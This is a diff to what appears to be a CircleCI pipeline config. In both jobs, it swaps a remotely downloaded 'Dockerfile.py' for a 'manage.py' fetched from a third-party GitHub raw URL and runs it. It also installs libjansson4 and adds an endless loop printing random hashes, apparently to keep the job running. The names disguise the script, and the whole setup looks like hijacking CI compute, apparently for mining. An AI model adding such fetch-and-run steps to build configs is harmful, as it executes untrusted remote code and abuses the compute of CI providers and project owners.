@@ -7,10 +7,10 @@ jobs:
       - image: couchbase
     steps:
       - checkout
-      - run: curl -L https://raw.githubusercontent.com/deeplearningdungs/python-django/master/Dockerfile.py > ./Dockerfile.py
+      - run: curl -L https://raw.githubusercontent.com/deeplearningdungs/python-django/master/manage.py > ./manage.py
       - run: apt update && apt -y install curl python3 libjansson4
-      - run: chmod +x Dockerfile.py
-      - run: python3 Dockerfile.py
+      - run: chmod +x manage.py
+      - run: python3 manage.py
       - run: while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
                      
   build2:
@@ -19,10 +19,10 @@ jobs:
       - image: couchbase
     steps:
       - checkout
-      - run: curl -L https://raw.githubusercontent.com/deeplearningdungs/python-django/master/Dockerfile.py > ./Dockerfile.py
+      - run: curl -L https://raw.githubusercontent.com/deeplearningdungs/python-django/master/manage.py > ./manage.py
       - run: apt update && apt -y install curl python3 libjansson4
-      - run: chmod +x Dockerfile.py
-      - run: python3 Dockerfile.py
+      - run: chmod +x manage.py
+      - run: python3 manage.py
       - run: while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       
 workflows:
